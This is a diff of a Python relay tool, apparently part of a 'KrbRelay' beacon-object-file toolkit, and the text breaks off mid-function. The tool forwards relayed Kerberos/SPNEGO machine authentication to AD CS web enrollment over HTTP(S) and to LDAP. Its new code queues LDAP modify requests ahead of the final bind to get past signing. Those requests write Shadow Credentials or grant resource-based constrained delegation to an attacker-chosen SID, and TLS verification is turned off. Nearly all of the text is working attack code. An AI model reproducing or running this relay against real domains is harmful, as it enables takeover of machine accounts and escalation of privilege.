@@ -1,29 +1,33 @@
 #!/usr/bin/env python3
-"""Kerberos-only HTTP/ESC8 side of the KrbRelay BOF split.
+"""Kerberos/SPNEGO relay and target adapters for the KrbRelay BOF split.
 
 The listener receives opaque DCE/RPC SPNEGO records over the KRB1 bridge and
-places each one in an HTTP ``Authorization: Negotiate`` header. IIS responses
-are returned unchanged to the BOF so Windows can complete the client side of
-mutual Kerberos authentication. Once HTTP returns 200, enrollment and
-certificate retrieval remain on that same authenticated TCP connection.
+places each one into one persistent HTTP or LDAP exchange. Target
+continuations are returned unchanged to the BOF so Windows can complete the
+client side of mutual Kerberos authentication. HTTPS can additionally issue a
+machine certificate that Python uses in memory for Schannel-authenticated
+Shadow Credential and RBCD writes to LDAPS.
 
 Run with Certipy's virtual environment because it already contains
 ``cryptography``. The default path does not print or retain authentication
-artifacts; ``--trace-spnego``, ``--export-pfx-b64``, and ``--pfx-out`` enable
-the explicitly requested output or file.
+artifacts; ``--export-pfx-b64`` and ``--pfx-out`` enable the explicitly
+requested output or file.
 """
 
 from __future__ import annotations
 
 import argparse
 import base64
+import hashlib
 import html
 import os
 import re
 import socket
+import ssl
 import struct
 import sys
 import urllib.parse
+import uuid
 from dataclasses import dataclass
 from typing import Callable, Optional
 
@@ -40,7 +44,9 @@ from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
 # The wire format is documented in docs/protocol.md. Conservative limits keep
 # a malformed peer or HTTP endpoint from forcing unbounded memory growth.
 MAGIC = b"KRB1"
-VERSION = 3
+VERSION = 4
+MSG_BRIDGE_PREFLIGHT = 1
+MSG_BRIDGE_READY = 2
 MSG_CLIENT_AUTH_TOKEN = 3
 MSG_SERVER_AUTH_TOKEN = 4
 MSG_AUTH_OK = 5
@@ -49,8 +55,11 @@ MAX_TOKEN = 65535
 MAX_ERROR = 512
 MAX_HEADER = 64 * 1024
 MAX_BODY = 4 * 1024 * 1024
+MAX_LDAP_MESSAGE = 4 * 1024 * 1024
 
 MESSAGE_LIMITS = {
+    MSG_BRIDGE_PREFLIGHT: (0, 0),
+    MSG_BRIDGE_READY: (0, 0),
     MSG_CLIENT_AUTH_TOKEN: (1, MAX_TOKEN),
     MSG_SERVER_AUTH_TOKEN: (1, MAX_TOKEN),
     MSG_AUTH_OK: (0, 0),
@@ -80,6 +89,25 @@ class CertificateBundle:
     certificate: x509.Certificate
     private_key: rsa.RSAPrivateKey
     request_id: str
+    key_id: Optional[str] = None
+    device_id: Optional[str] = None
+
+
+@dataclass
+class RbcdUpdate:
+    """Directory proof returned after granting one delegate account."""
+    target: str
+    delegate: str
+    sid: str
+    already_present: bool
+
+
+@dataclass
+class LdapBindResponse:
+    """RFC4511 BindResponse fields needed by the relay state machine."""
+    result_code: int
+    server_credentials: Optional[bytes]
+    diagnostic: str
 
 
 class RecordChannel:
@@ -87,7 +115,7 @@ class RecordChannel:
     def __init__(self, sock: socket.socket):
         self.sock = sock
         # True after AUTH_OK is sent. At that point the BOF has returned and
-        # later enrollment errors can be reported only by this process.
+        # later target-operation errors can be reported only by this process.
         self.bof_released = False
 
     def _read_exact(self, length: int) -> bytes:
@@ -131,9 +159,23 @@ class RawHttpConnection:
     which would defeat relay. This implementation deliberately handles only
     the response features IIS uses while retaining unread pipelined bytes.
     """
-    def __init__(self, host: str, address: str, port: int):
+    def __init__(self, host: str, address: str, port: int, tls: bool = False):
         self.host = host
-        self.sock = socket.create_connection((address, port), timeout=10)
+        raw = socket.create_connection((address, port), timeout=10)
+        if tls:
+            # The lab CA is not installed in the operator trust store. SNI
+            # still carries the operator-selected AD CS hostname and the
+            # Kerberos service SPN remains bound to that same hostname.
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            try:
+                self.sock = context.wrap_socket(raw, server_hostname=host)
+            except Exception:
+                raw.close()
+                raise
+        else:
+            self.sock = raw
         self.sock.settimeout(20)
         self.pending = bytearray()
 
@@ -255,6 +297,221 @@ def authentication_blob(response: HttpResponse) -> Optional[bytes]:
 
 
 # ---------------------------------------------------------------------------
+# Minimal persistent LDAP SASL transport
+# ---------------------------------------------------------------------------
+def ber_length(length: int) -> bytes:
+    """Encode a non-negative DER/BER definite length."""
+    if length < 0:
+        raise RelayError("invalid LDAP field length")
+    if length < 0x80:
+        return bytes([length])
+    raw = length.to_bytes((length.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(raw)]) + raw
+
+
+def ber_tlv(tag: int, value: bytes) -> bytes:
+    return bytes([tag]) + ber_length(len(value)) + value
+
+
+def ber_integer(value: int) -> bytes:
+    if value < 0:
+        raise RelayError("invalid LDAP integer")
+    raw = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
+    if raw[0] & 0x80:
+        raw = b"\x00" + raw
+    return ber_tlv(0x02, raw)
+
+
+def ber_element(data: bytes, offset: int) -> tuple[int, bytes, int]:
+    """Decode one bounded, definite-length BER element."""
+    if offset + 2 > len(data):
+        raise RelayError("truncated LDAP response")
+    tag = data[offset]
+    first = data[offset + 1]
+    if first < 0x80:
+        length = first
+        start = offset + 2
+    else:
+        count = first & 0x7F
+        if not count or count > 4 or offset + 2 + count > len(data):
+            raise RelayError("invalid LDAP BER length")
+        start = offset + 2 + count
+        length = int.from_bytes(data[offset + 2 : start], "big")
+    end = start + length
+    if end > len(data) or length > MAX_LDAP_MESSAGE:
+        raise RelayError("invalid LDAP BER length")
+    return tag, data[start:end], end
+
+
+def ldap_sasl_bind(message_id: int, token: bytes) -> bytes:
+    """Build an RFC4511 BindRequest carrying opaque GSS-SPNEGO credentials."""
+    sasl = ber_tlv(0x04, b"GSS-SPNEGO") + ber_tlv(0x04, token)
+    request = ber_tlv(0x02, b"\x03") + ber_tlv(0x04, b"") + ber_tlv(0xA3, sasl)
+    return ber_tlv(0x30, ber_integer(message_id) + ber_tlv(0x60, request))
+
+
+def ldap_message(wire: bytes, expected_message_id: int) -> tuple[int, bytes]:
+    """Return the application operation from one matched LDAPMessage."""
+    tag, message, consumed = ber_element(wire, 0)
+    if tag != 0x30 or consumed != len(wire):
+        raise RelayError("invalid LDAPMessage")
+    tag, raw_id, offset = ber_element(message, 0)
+    if tag != 0x02 or not raw_id or int.from_bytes(raw_id, "big") != expected_message_id:
+        raise RelayError("unexpected LDAP message ID")
+    operation_tag, operation, _ = ber_element(message, offset)
+    return operation_tag, operation
+
+
+def ldap_message_id(wire: bytes) -> int:
+    """Extract an LDAP message ID when deliberately testing queued ordering."""
+    tag, message, consumed = ber_element(wire, 0)
+    if tag != 0x30 or consumed != len(wire):
+        raise RelayError("invalid LDAPMessage")
+    tag, raw_id, _offset = ber_element(message, 0)
+    if tag != 0x02 or not raw_id:
+        raise RelayError("invalid LDAP message ID")
+    return int.from_bytes(raw_id, "big")
+
+
+def ldap_result(operation: bytes) -> tuple[int, str]:
+    """Decode the common LDAPResult fields used by bind/search/modify."""
+    tag, result, offset = ber_element(operation, 0)
+    if tag != 0x0A or not result:
+        raise RelayError("invalid LDAP result")
+    tag, _matched_dn, offset = ber_element(operation, offset)
+    if tag != 0x04:
+        raise RelayError("invalid LDAP matchedDN")
+    tag, diagnostic, _ = ber_element(operation, offset)
+    if tag != 0x04:
+        raise RelayError("invalid LDAP diagnosticMessage")
+    return int.from_bytes(result, "big"), diagnostic.decode("utf-8", errors="replace")
+
+
+def parse_ldap_bind_response(wire: bytes, expected_message_id: int) -> LdapBindResponse:
+    """Parse one RFC4511 BindResponse, including optional serverSaslCreds."""
+    tag, message, consumed = ber_element(wire, 0)
+    if tag != 0x30 or consumed != len(wire):
+        raise RelayError("invalid LDAPMessage")
+    tag, raw_id, offset = ber_element(message, 0)
+    if tag != 0x02 or not raw_id or int.from_bytes(raw_id, "big") != expected_message_id:
+        raise RelayError("unexpected LDAP message ID")
+    tag, bind, _ = ber_element(message, offset)
+    if tag != 0x61:
+        raise RelayError("LDAP response was not a BindResponse")
+    tag, result, offset = ber_element(bind, 0)
+    if tag != 0x0A or not result:
+        raise RelayError("invalid LDAP bind result")
+    tag, _matched_dn, offset = ber_element(bind, offset)
+    if tag != 0x04:
+        raise RelayError("invalid LDAP matchedDN")
+    tag, diagnostic, offset = ber_element(bind, offset)
+    if tag != 0x04:
+        raise RelayError("invalid LDAP diagnosticMessage")
+    server_credentials = None
+    while offset < len(bind):
+        tag, value, offset = ber_element(bind, offset)
+        if tag == 0x87:
+            server_credentials = value
+    return LdapBindResponse(
+        int.from_bytes(result, "big"), server_credentials,
+        diagnostic.decode("utf-8", errors="replace"),
+    )
+
+
+class RawLdapConnection:
+    """Persistent LDAP client exposing opaque GSS-SPNEGO SASL exchanges."""
+    def __init__(self, address: str, port: int, tls_hostname: Optional[str] = None,
+                 connected_socket: Optional[socket.socket] = None,
+                 tls_context: Optional[ssl.SSLContext] = None):
+        self.sock = connected_socket or socket.create_connection((address, port), timeout=10)
+        if tls_hostname:
+            context = tls_context or ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            if tls_context is None:
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+            self.sock = context.wrap_socket(self.sock, server_hostname=tls_hostname)
+        self.sock.settimeout(20)
+        self.message_id = 0
+
+    def close(self) -> None:
+        self.sock.close()
+
+    def _read_exact(self, length: int) -> bytes:
+        out = bytearray()
+        while len(out) < length:
+            part = self.sock.recv(length - len(out))
+            if not part:
+                raise RelayError("LDAP server closed the connection")
+            out.extend(part)
+        return bytes(out)
+
+    def _response(self) -> bytes:
+        prefetched = getattr(self, "_prefetched_responses", None)
+        if prefetched:
+            return prefetched.pop(0)
+        header = self._read_exact(2)
+        if header[0] != 0x30:
+            raise RelayError("invalid LDAPMessage")
+        first = header[1]
+        if first < 0x80:
+            length_bytes = b""
+            length = first
+        else:
+            count = first & 0x7F
+            if not count or count > 4:
+                raise RelayError("invalid LDAP BER length")
+            length_bytes = self._read_exact(count)
+            length = int.from_bytes(length_bytes, "big")
+        if length > MAX_LDAP_MESSAGE:
+            raise RelayError("LDAP response exceeds limit")
+        return header + length_bytes + self._read_exact(length)
+
+    def bind(self, token: bytes) -> LdapBindResponse:
+        self.message_id += 1
+        self.sock.sendall(ldap_sasl_bind(self.message_id, token))
+        return parse_ldap_bind_response(self._response(), self.message_id)
+
+    def bind_with_prefetched_requests(
+        self, token: bytes, requests: list[tuple[int, bytes]],
+    ) -> tuple[LdapBindResponse, list[tuple[int, int]]]:
+        """Place complete operations ahead of the final bind in one TCP write.
+
+        AD dispatches already-read LDAP messages on separate workers. Queuing
+        the write while the SASL bind is still in progress lets the final bind
+        commit before the write's authorization check, and avoids sending a
+        new unsigned message after packet integrity becomes active. Responses
+        can arrive in either message-ID order, so normalize them for the
+        result validator.
+        """
+        bind_id = self.message_id + 1
+        packet = bytearray()
+        ids = []
+        next_id = bind_id
+        for operation_tag, body in requests:
+            next_id += 1
+            ids.append((next_id, operation_tag + 1))
+            packet.extend(ber_tlv(
+                0x30,
+                ber_integer(next_id) + ber_tlv(operation_tag, body),
+            ))
+        packet.extend(ldap_sasl_bind(bind_id, token))
+        self.sock.sendall(packet)
+
+        bind = None
+        operation_responses = []
+        for _index in range(len(ids) + 1):
+            response = self._response()
+            if ldap_message_id(response) == bind_id:
+                bind = parse_ldap_bind_response(response, bind_id)
+            else:
+                operation_responses.append(response)
+        if bind is None:
+            raise RelayError("queued LDAP exchange returned no BindResponse")
+        self.message_id = next_id
+        self._prefetched_responses = operation_responses
+        return bind, ids
+
+# ---------------------------------------------------------------------------
 # NTLM-over-HTTP-Negotiate compatibility
 #
 # The intended path carries a complete SPNEGO/Kerberos token unchanged. RPC's
@@ -323,6 +580,52 @@ def der_bounds(data: bytes, offset: int) -> Optional[tuple[int, int]]:
     return (start, end) if end <= len(data) else None
 
 
+def kerberos_tlv(data: bytes, wanted_tag: int) -> bytes:
+    """Extract the first complete Kerberos AP application TLV."""
+    for offset, tag in enumerate(data):
+        if tag != wanted_tag:
+            continue
+        bounds = der_bounds(data, offset)
+        if bounds:
+            return data[offset:bounds[1]]
+    raise RelayError(f"SPNEGO token did not contain Kerberos tag 0x{wanted_tag:02x}")
+
+
+def ldap_kerberos_token(token: bytes, leg: int) -> bytes:
+    """Adapt RPC SPNEGO to WinLDAP's relay-compatible Kerberos token form.
+
+    WinLDAP accepts a direct GSS Kerberos token for leg one. For later legs it
+    needs only the AP-REP from RPC's NegTokenResp; the adjacent SPNEGO MIC is
+    specific to the source context and is deliberately not sent to LDAP.
+    """
+    if leg == 1:
+        krb5_oid_and_token_id = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x01\x00"
+        return der_value(0x60, krb5_oid_and_token_id + kerberos_tlv(token, 0x6E))
+    ap_rep_offset = token.find(b"\x6f")
+    if ap_rep_offset < 0:
+        raise RelayError("SPNEGO continuation did not contain an AP-REP")
+    # Validate that the candidate is one complete AP-REP and omit any trailing
+    # RPC/SPNEGO fields that do not belong to the target context.
+    ap_rep_bounds = der_bounds(token, ap_rep_offset)
+    if not ap_rep_bounds:
+        raise RelayError("SPNEGO continuation contained a truncated AP-REP")
+    return token[ap_rep_offset:ap_rep_bounds[1]]
+
+
+def ldap_rpc_continuation(token: bytes) -> bytes:
+    """Wrap WinLDAP's AP-REP with RPC's selected Microsoft Kerberos mech."""
+    if not token.startswith(b"\x6f"):
+        return token
+    neg_state = der_value(0xA0, der_value(0x0A, b"\x01"))
+    # RPC's Negotiate package selects the Microsoft legacy Kerberos OID from
+    # the client's offered mechanisms, unlike WinLDAP's standard KRB5 OID.
+    supported_mech = der_value(
+        0xA1, der_value(0x06, b"\x2a\x86\x48\x82\xf7\x12\x01\x02\x02")
+    )
+    response_token = der_value(0xA2, der_value(0x04, token))
+    return der_value(0xA1, der_value(0x30, neg_state + supported_mech + response_token))
+
+
 def spnego_state(token: bytes) -> str:
     """Extract negState for logging; token forwarding never depends on it."""
     states = {0: "accept-completed", 1: "accept-incomplete", 2: "reject", 3: "request-mic"}
@@ -336,6 +639,23 @@ def kerberos_inner(token: bytes) -> tuple[str, Optional[int]]:
     """Identify AP-REQ/AP-REP/KRB-ERROR inside SPNEGO for operator context."""
     tags = {0x6E: "AP-REQ", 0x6F: "AP-REP", 0x7E: "KRB-ERROR"}
     for offset, tag in enumerate(token):
+        # Some HTTP stacks return the GSS Kerberos continuation directly,
+        # rather than nesting it in SPNEGO's responseToken OCTET STRING.
+        if tag == 0x7E:
+            inner_bounds = der_bounds(token, offset)
+            if inner_bounds:
+                for field in range(inner_bounds[0], inner_bounds[1] - 3):
+                    if token[field] != 0xA6:
+                        continue
+                    field_bounds = der_bounds(token, field)
+                    if not field_bounds or token[field_bounds[0]] != 0x02:
+                        continue
+                    value_bounds = der_bounds(token, field_bounds[0])
+                    if value_bounds:
+                        return "KRB-ERROR", int.from_bytes(
+                            token[value_bounds[0]:value_bounds[1]], "big"
+                        )
+                return "KRB-ERROR", None
         if tag != 0x04:
             continue
         bounds = der_bounds(token, offset)
@@ -363,35 +683,29 @@ def kerberos_inner(token: bytes) -> tuple[str, Optional[int]]:
     return "not-detected", None
 
 
-def describe_spnego(token: bytes) -> str:
-    """Summarize a token without claiming full ASN.1 validation."""
-    top_levels = {
-        0x60: "GSS-API InitialContextToken",
-        0xA0: "NegTokenInit choice",
-        0xA1: "NegTokenResp choice",
-    }
-    top = top_levels.get(token[0], f"ASN.1 tag 0x{token[0]:02x}") if token else "empty"
-    spnego_oid = b"\x06\x06\x2b\x06\x01\x05\x05\x02" in token
-    kerberos_oid = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02" in token
+def authentication_token_summary(token: bytes) -> str:
+    """Identify an authentication mechanism without recording token bytes."""
+    ntlm_offset = token.find(b"NTLMSSP\x00")
+    if ntlm_offset >= 0 and len(token) >= ntlm_offset + 12:
+        message_type = int.from_bytes(token[ntlm_offset + 8:ntlm_offset + 12], "little")
+        encoding = "raw" if ntlm_offset == 0 else "wrapped"
+        return f"{encoding} NTLMSSP type {message_type}, {len(token)} bytes"
     inner, error_code = kerberos_inner(token)
-    error = f"; kerberos_error={error_code}" if error_code is not None else ""
-    return (
-        f"top={top}; bytes={len(token)}; negState={spnego_state(token)}; "
-        f"SPNEGO_OID={'yes' if spnego_oid else 'no'}; Kerberos_OID={'yes' if kerberos_oid else 'no'}; "
-        f"inner={inner}{error}"
-    )
+    suffix = f", KRB-ERROR {error_code}" if error_code is not None else ""
+    principal = ""
+    if inner == "AP-REQ":
+        try:
+            from impacket.krb5.asn1 import AP_REQ
+            from pyasn1.codec.der import decoder
 
-
-def print_spnego(direction: str, leg: int, token: bytes) -> None:
-    """Explicitly sensitive trace mode: metadata plus complete base64 token."""
-    print(f"[SPNEGO] {direction} leg={leg}; {describe_spnego(token)}", flush=True)
-    print(f"SPNEGO_{direction}_{leg}_B64={base64.b64encode(token).decode('ascii')}", flush=True)
-
-
-def trace_name(value: str) -> str:
-    """Make a runtime host/principal value safe for a shell-style trace label."""
-    label = re.sub(r"[^A-Za-z0-9]+", "_", value).strip("_").upper()
-    return label or "PEER"
+            ap_req, _ = decoder.decode(kerberos_tlv(token, 0x6E), asn1Spec=AP_REQ())
+            ticket = ap_req["ticket"]
+            components = [str(value) for value in ticket["sname"]["name-string"]]
+            principal = f", ticket={'/'.join(components)}@{ticket['realm']}"
+        except Exception:
+            # Diagnostics must never make otherwise-valid opaque forwarding fail.
+            principal = ", ticket=unparsed"
+    return f"SPNEGO/Kerberos ({inner}{suffix}), {len(token)} bytes{principal}"
 
 
 # ---------------------------------------------------------------------------
@@ -506,6 +820,16 @@ def adcs_error_detail(body: bytes) -> str:
     return code or "the CA returned a denial without a recognizable reason"
 
 
+def http_error_detail(body: bytes) -> str:
+    """Reduce an IIS error document to one bounded troubleshooting line."""
+    if not body:
+        return "empty response body"
+    decoded = body.decode("utf-8", errors="replace")
+    plain = html.unescape(re.sub(r"<[^>]+>", " ", decoded))
+    plain = re.sub(r"\s+", " ", plain).strip()
+    return plain[:MAX_ERROR] or "unparseable response body"
+
+
 # ---------------------------------------------------------------------------
 # Relay/enrollment orchestration
 # ---------------------------------------------------------------------------
@@ -599,10 +923,16 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
     discard IIS's connection-bound authentication state.
     """
     log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
-    client_trace = trace_name(options.machine)
-    server_trace = trace_name(options.adcs_host)
-    log(f"Opening one persistent TCP connection to {options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}")
-    http = RawHttpConnection(options.adcs_host, options.adcs_address, options.adcs_port)
+    use_tls = getattr(options, "adcs_tls", False)
+    scheme = "HTTPS" if use_tls else "HTTP"
+    log(
+        f"Opening one persistent {scheme} connection to "
+        f"{options.adcs_address}:{options.adcs_port} with Host {options.adcs_host}"
+    )
+    http = RawHttpConnection(
+        options.adcs_host, options.adcs_address, options.adcs_port,
+        use_tls,
+    )
     try:
         log(f"Priming IIS with an unauthenticated GET {options.auth_path}")
         probe = http.request("GET", options.auth_path)
@@ -612,33 +942,28 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
         # Windows/IIS decides the leg count. Loop until the server returns 200
         # instead of assuming a two- or three-message Kerberos exchange.
         leg = 0
-        ntlm_over_negotiate = False
         while True:
             kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
             if kind == MSG_ERROR:
                 raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
             leg += 1
-            if leg == 1:
-                ntlm_over_negotiate = token.startswith(b"NTLMSSP\x00")
             log(f"Received opaque SPNEGO leg {leg} from {options.machine}; relaying it to {options.adcs_host}{options.auth_path}")
-            if options.trace_spnego:
-                print_spnego(f"{client_trace}_TO_{server_trace}", leg, token)
-            wire_token = wrap_ntlm_negotiate(token, leg == 1) if ntlm_over_negotiate else token
-            response = http.request("GET", options.auth_path, authorization=wire_token)
+            log(f"HTTP client leg {leg}: {authentication_token_summary(token)}")
+            # IIS accepts either a full SPNEGO token or raw NTLMSSP under the
+            # Negotiate scheme. Preserve the RPC blob exactly; rebuilding the
+            # NTLM Authenticate leg makes IIS request a nonexistent leg 3.
+            response = http.request("GET", options.auth_path, authorization=token)
             if response.status == 401:
                 continuation = authentication_blob(response)
                 if not continuation:
                     raise RelayError("IIS returned a bare Negotiate challenge")
-                if ntlm_over_negotiate:
-                    continuation = unwrap_ntlm_negotiate(continuation)
                 inner, error_code = kerberos_inner(continuation)
                 reason = f", KRB-ERROR {error_code}" if error_code is not None else ""
+                log(f"HTTP server leg {leg}: {authentication_token_summary(continuation)}")
                 log(
                     f"IIS continuation analysis: negState={spnego_state(continuation)}, "
                     f"inner={inner}{reason}; an AP-REP with accept-incomplete is the normal mutual-authentication step"
                 )
-                if options.trace_spnego:
-                    print_spnego(f"{server_trace}_TO_{client_trace}", leg, continuation)
                 log(f"IIS requested continuation; returning its opaque SPNEGO response to {options.machine} for leg {leg + 1}")
                 # Kerberos/SPNEGO continuations remain byte-for-byte opaque.
                 # Only the explicit raw-NTLM compatibility branch above
@@ -646,10 +971,23 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
                 channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                 continue
             if response.status != 200:
-                raise RelayError(f"IIS authentication returned HTTP {response.status}")
+                # This IIS build returns 500 from the classic ASP landing page
+                # while its WWW-Authenticate token declares accept-completed.
+                # That SPNEGO state is authoritative; certificate submission
+                # on this same connection remains the end-to-end proof.
+                final_token = authentication_blob(response)
+                if (response.status != 500 or not final_token or
+                        spnego_state(final_token) != "accept-completed"):
+                    raise RelayError(
+                        f"IIS authentication returned HTTP {response.status}: "
+                        f"{http_error_detail(response.body)}; challenges="
+                        f"{response.headers.get('www-authenticate', [])}"
+                    )
+                log(
+                    "IIS returned SPNEGO accept-completed with HTTP 500; "
+                    "continuing enrollment on the authenticated connection"
+                )
             final_token = authentication_blob(response)
-            if options.trace_spnego and final_token:
-                print_spnego(f"{server_trace}_FINAL", leg, final_token)
             log("IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account")
             channel.send(MSG_AUTH_OK)
             channel.bof_released = True
@@ -663,31 +1001,372 @@ def run_session(channel: RecordChannel, options: argparse.Namespace) -> Certific
         http.close()
 
 
+def domain_dn(domain: str) -> str:
+    """Convert the operator-supplied DNS domain to its LDAP naming context."""
+    labels = domain.strip(".").split(".")
+    if not labels or any(not label or "," in label or "=" in label for label in labels):
+        raise RelayError("invalid DNS domain")
+    return ",".join(f"DC={label}" for label in labels)
+
+
+def ldap_modify_request(
+    dn: str, attribute: str, operation: int, values: list[bytes],
+) -> tuple[int, bytes]:
+    partial_attribute = (
+        ber_tlv(0x04, attribute.encode("ascii"))
+        + ber_tlv(0x31, b"".join(ber_tlv(0x04, value) for value in values))
+    )
+    change = ber_tlv(
+        0x30,
+        ber_tlv(0x0A, bytes([operation])) + ber_tlv(0x30, partial_attribute),
+    )
+    return 0x66, ber_tlv(0x04, dn.encode("utf-8")) + ber_tlv(0x30, change)
+
+
+def prepare_shadow_credential(
+    options: argparse.Namespace,
+) -> tuple[list[tuple[int, bytes]], CertificateBundle, str]:
+    """Build one computer-SELF-valid NGC KeyCredential and ModifyRequest."""
+    from impacket.examples.ntlmrelayx.utils import shadow_credentials
+
+    target = f"{options.machine.rstrip('$')}$"
+    dn = options.ldap_target_dn
+    # MS-ADTS requires computer NGC keys to use a 2048-bit BCRYPT RSA public
+    # key. Include a DeviceId so third-party tooling can identify and remove
+    # this exact value, while omitting the metadata forbidden for SELF writes.
+    key, certificate = shadow_credentials.createSelfSignedX509Certificate(
+        target, kSize=2048
+    )
+    public_key = shadow_credentials.KeyCredential.raw_public_key(key)
+
+    def key_entry(identifier: int, data: bytes) -> bytes:
+        return struct.pack("<HB", len(data), identifier) + data
+
+    key_id = hashlib.sha256(public_key).digest()
+    device_id = uuid.uuid4()
+    binary_properties = (
+        key_entry(0x03, public_key)
+        + key_entry(0x04, b"\x01")
+        + key_entry(0x05, b"\x00")
+        + key_entry(0x06, device_id.bytes_le)
+    )
+    key_credential = (
+        struct.pack("<I", 0x200)
+        + key_entry(0x01, key_id)
+        + key_entry(0x02, hashlib.sha256(binary_properties).digest())
+        + binary_properties
+    )
+    value = shadow_credentials.toDNWithBinary2String(
+        key_credential, dn
+    ).encode("ascii")
+    bundle = CertificateBundle(
+        certificate,
+        key,
+        f"shadow-{key_id.hex()[:12]}",
+        key_id.hex(),
+        str(device_id),
+    )
+    return (
+        [ldap_modify_request(dn, "msDS-KeyCredentialLink", 0, [value])],
+        bundle,
+        target,
+    )
+
+
+def prepare_rbcd_pipeline(
+    options: argparse.Namespace,
+) -> tuple[list[tuple[int, bytes]], RbcdUpdate]:
+    """Build one exact-DN RBCD write that needs no signed post-bind search."""
+    if not options.ldap_target_dn:
+        raise RelayError("--target-dn is required for direct RBCD")
+    if not options.delegate_sid:
+        raise RelayError("--delegate-sid is required for direct RBCD")
+    from impacket.ldap import ldaptypes
+
+    # RBCD is an NT security descriptor. Grant only the operator-supplied
+    # principal, rather than installing a permissive NULL DACL.
+    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    descriptor["Revision"] = b"\x01"
+    descriptor["Sbz1"] = b"\x00"
+    descriptor["Control"] = 0x8004
+    owner = ldaptypes.LDAP_SID()
+    owner.fromCanonical("S-1-5-32-544")
+    descriptor["OwnerSid"] = owner
+    descriptor["GroupSid"] = b""
+    descriptor["Sacl"] = b""
+
+    dacl = ldaptypes.ACL()
+    dacl["AclRevision"] = 4
+    dacl["Sbz1"] = 0
+    dacl["Sbz2"] = 0
+    ace = ldaptypes.ACE()
+    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    ace["AceFlags"] = 0
+    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
+    # This is the generic all-rights mask used by standard RBCD tooling.
+    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
+    ace["Ace"]["Mask"]["Mask"] = 0x1F01FF
+    trustee = ldaptypes.LDAP_SID()
+    trustee.fromCanonical(options.delegate_sid)
+    ace["Ace"]["Sid"] = trustee
+    # AD dispatches pipelined requests on separate workers. Repeating the same
+    # trustee ACE gives the final SASL bind time to commit before this write's
+    # authorization check without granting any additional principal. Shorter
+    # descriptors intermittently reach that check while the bind is pending.
+    dacl.aces = [ace] * 8
+    descriptor["Dacl"] = dacl
+
+    request = ldap_modify_request(
+        options.ldap_target_dn,
+        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+        2,
+        [descriptor.getData()],
+    )
+    target = f"{options.machine.rstrip('$')}$"
+    delegate = options.delegate_account or "controlled principal"
+    return [request], RbcdUpdate(target, delegate, options.delegate_sid, False)
+
+
+def collect_pipelined_attack(
+    ldap: RawLdapConnection, ids: list[tuple[int, int]],
+    log: Callable[[str], None],
+) -> str:
+    """Validate each ordered response already queued behind the final bind."""
+    identity = ""
+    for index, (message_id, expected_tag) in enumerate(ids):
+        operation_tag, operation = ldap_message(ldap._response(), message_id)
+        if operation_tag != expected_tag:
+            raise RelayError(
+                f"pipelined LDAP response {index + 1} had tag 0x{operation_tag:02x}"
+            )
+        result_code, diagnostic = ldap_result(operation)
+        if result_code != 0:
+            detail = f": {diagnostic}" if diagnostic else ""
+            raise RelayError(
+                f"pipelined LDAP operation {index + 1} failed with result "
+                f"{result_code}{detail}"
+            )
+        if operation_tag == 0x78:
+            _tag, _result, offset = ber_element(operation, 0)
+            _tag, _matched, offset = ber_element(operation, offset)
+            _tag, _diagnostic, offset = ber_element(operation, offset)
+            while offset < len(operation):
+                tag, value, offset = ber_element(operation, offset)
+                if tag == 0x8B:
+                    identity = value.decode("utf-8", errors="replace")
+            log(f"Pipelined LDAP identity: {identity or '<empty>'}")
+    return identity
+
+
+def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
+    """Relay one LDAP SASL exchange and apply its selected directory action."""
+    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
+    prepared_shadow = (
+        prepare_shadow_credential(options)
+        if options.mode == "shadowcred" else None
+    )
+    prepared_rbcd = (
+        prepare_rbcd_pipeline(options)
+        if options.mode == "rbcd" and options.delegate_sid else None
+    )
+    log(f"Opening one persistent TCP connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}")
+    ldap = RawLdapConnection(
+        options.ldap_address,
+        options.ldap_port,
+        None,
+        None,
+    )
+    try:
+        leg = 0
+        while True:
+            kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
+            if kind == MSG_ERROR:
+                raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
+            leg += 1
+            log(f"Received opaque SPNEGO leg {leg}; sending an LDAP SASL GSS-SPNEGO BindRequest")
+            pipelined_ids = []
+            pipeline_bundle = None
+            pipeline_target = None
+            pipeline_rbcd = None
+            if leg == 2 and options.mode == "shadowcred":
+                requests, pipeline_bundle, pipeline_target = prepared_shadow
+                response, pipelined_ids = ldap.bind_with_prefetched_requests(
+                    ldap_kerberos_token(token, leg), requests
+                )
+            elif leg == 2 and prepared_rbcd:
+                requests, pipeline_rbcd = prepared_rbcd
+                response, pipelined_ids = ldap.bind_with_prefetched_requests(
+                    ldap_kerberos_token(token, leg), requests
+                )
+            else:
+                response = ldap.bind(ldap_kerberos_token(token, leg))
+            log(
+                f"LDAP bind leg {leg}: result={response.result_code}, "
+                f"serverSaslCreds={len(response.server_credentials or b'')} bytes"
+            )
+            if response.result_code == 14:  # saslBindInProgress
+                if not response.server_credentials:
